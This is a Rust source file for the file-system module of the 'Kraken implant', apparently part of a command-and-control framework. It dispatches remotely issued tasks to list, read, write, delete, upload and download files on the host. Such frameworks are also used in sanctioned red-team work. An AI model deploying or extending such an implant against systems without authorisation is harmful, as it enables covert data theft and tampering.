//! mod-file: File system operations module for Kraken implant
//!
//! Provides file listing, reading, writing, deletion, upload, and download capabilities.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{file_task, FileTask};

mod ops;

pub struct FileModule {
    id: ModuleId,
}

impl FileModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("file"),
        }
    }
}

impl Default for FileModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for FileModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "File"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: FileTask =
            FileTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(file_task::Operation::List(list)) => {
                let result = ops::list_directory(&list)?;
                Ok(TaskResult::DirectoryListing(result))
            }
            Some(file_task::Operation::Read(read)) => {
                let result = ops::read_file(&read)?;
                Ok(TaskResult::FileContents(result))
            }
            Some(file_task::Operation::Write(write)) => {
                let result = ops::write_file(&write)?;
                Ok(TaskResult::FileOperation(result))
            }
            Some(file_task::Operation::Delete(delete)) => {
                let result = ops::delete_file(&delete)?;
                Ok(TaskResult::FileOperation(result))
            }
            Some(file_task::Operation::Upload(upload)) => {
                let result = ops::upload_file(&upload)?;
                Ok(TaskResult::FileOperation(result))
            }
            Some(file_task::Operation::Download(download)) => {
                let result = ops::download_file(&download)?;
                Ok(TaskResult::FileContents(result))
            }
            Some(file_task::Operation::UploadChunked(upload_chunked)) => {
                let result = ops::upload_file_chunked(&upload_chunked)?;
                Ok(TaskResult::FileOperation(result))
            }
            Some(file_task::Operation::DownloadChunked(download_chunked)) => {
                let result = ops::download_file_chunked(&download_chunked)?;
                Ok(TaskResult::FileDownloadChunk(result))
            }
            None => Err(KrakenError::Protocol("missing file operation".into())),
        }
    }
}

// For dynamic loading support (only emitted when building standalone dynamic module)
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(FileModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = FileModule::new();
        assert_eq!(module.id().as_str(), "file");
        assert_eq!(module.name(), "File");
    }
}
